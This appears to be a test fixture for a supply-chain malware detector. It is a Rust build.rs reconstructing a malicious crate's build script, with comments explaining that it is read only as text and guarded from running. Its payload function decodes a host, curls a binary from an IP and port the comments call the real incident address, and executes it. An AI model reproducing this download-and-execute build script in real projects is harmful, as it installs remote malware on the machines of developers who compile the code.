// Reconstruction of the 2026-08-20 proc-macro1 1.0.107 build script shape:
// decode a base64 host, download an architecture-specific binary over the
// network, then execute it with a C2 address as an argument.
//
// SAFETY, and the reason for the dead branch below: cargo compiles AND RUNS a
// build script, so a fixture that called this at top level would make every
// test run shell out to the real address from the incident. The detector reads
// this file as text and never executes it, so the payload lives behind a guard
// that is never true. Keep it that way.
use std::process::Command;

fn main() {
    println!("cargo:rerun-if-changed=build.rs");
    if std::env::var("RSA_FIXTURE_NEVER_SET").is_ok() {
        payload(); // unreachable in the suite, by construction
    }
}

fn payload() {
    let host = String::from_utf8(base64_decode(b"MjMuMjU0LjE2NS4xMTI6OTA4OQ==")).unwrap();
    let url = format!("http://{host}/payload");
    let _ = Command::new("curl").arg("-o").arg("/tmp/x").arg(&url).status();
    let _ = Command::new("/tmp/x").arg(&host).status();
}

fn base64_decode(_b: &[u8]) -> Vec<u8> {
    b"23.254.165.112:9089".to_vec()
}
